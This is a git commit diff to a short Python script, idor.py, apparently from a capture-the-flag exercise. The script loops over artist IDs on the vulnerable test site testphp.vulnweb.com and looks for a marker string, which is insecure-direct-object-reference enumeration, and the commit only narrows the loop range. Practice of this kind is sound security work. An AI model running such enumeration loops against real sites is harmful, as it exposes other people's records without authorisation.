d59aef765cbb222cf2700abab69c5f5c64bf6a43
posix <apipactf@proton.me>
2025-12-18 10:07:55 +0100

    Update idor.py

--- idor.py
+++ idor.py
@@ -1,7 +1,7 @@
 import requests
 
 with requests.session() as s:
-    for i in range(0, 200):
+    for i in range(0, 100):
         response = s.get("http://testphp.vulnweb.com/artists.php?artist=%s" % (str(i)))
         if "lyzae" in response.text:
             print(response.url)
